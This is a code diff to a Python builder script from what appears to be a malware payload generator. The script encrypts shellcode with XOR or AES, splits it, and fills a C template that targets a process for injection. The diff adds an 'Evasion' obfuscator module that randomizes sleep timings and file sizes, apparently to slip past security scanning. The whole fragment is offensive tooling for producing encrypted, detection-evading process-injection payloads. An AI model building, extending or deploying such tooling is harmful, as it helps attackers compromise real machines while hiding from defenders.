@@ -2,11 +2,12 @@ import random
 import os
 
 from Dll_Names.Dlls import dll_names
-from Encryption.XOR import DoXor,key,key_hex
+from Encryption.Xor import DoXor,key,key_hex
 from Templates.Split_Xor_Shellcode import split_xor_shellcode
 from Templates.C_Template import template
 from Templates.Arguments  import parse_arguments
 from Encryption.AES import encryptAES,keyAES
+from Evasion.Obfuscator import obfuscatorArray,obfuscatorSize
 
 def Controller():
 
@@ -33,6 +34,7 @@ def Controller():
         xor_func = args.rxor
         key_var = args.rkey
         time = args.rsleep
+        size = args.size
     except:
         parse_arguments()
         sys.exit()
@@ -40,17 +42,21 @@ def Controller():
     with open(os.path.join(folder_path, file_option), "r") as f:
         # Read the contents of the file
         file_contents = f.read()
-
+    
+    #Initialize random (30) numbers array
+    timeArray = obfuscatorArray(time)
+    #Initialze random filesizes
+    sizeArray = obfuscatorSize(size)
 
     if encryption_type == "XOR":
         ciphertext = DoXor(plaintext, key)
         ciphertext_split = split_xor_shellcode(ciphertext)
-        c_template=template(file_contents,xor_func,shellcode_var,ciphertext_split,key_var,key_hex,process_to_inject,time,injection,encryption_type)
+        c_template=template(file_contents,xor_func,shellcode_var,ciphertext_split,key_var,key_hex,process_to_inject,time,injection,encryption_type,timeArray,sizeArray)
 
     elif encryption_type == "AES":
         ciphertext = encryptAES(plaintext,keyAES)
         ciphertext_split = split_xor_shellcode(ciphertext)
-        c_template=template(file_contents,xor_func,shellcode_var,ciphertext_split,key_var,keyAES,process_to_inject,time,injection,encryption_type)
+        c_template=template(file_contents,xor_func,shellcode_var,ciphertext_split,key_var,keyAES,process_to_inject,time,injection,encryption_type,timeArray,sizeArray)
 
     # Create the output folder if it doesn't exist
     if not os.path.exists(output_folder):
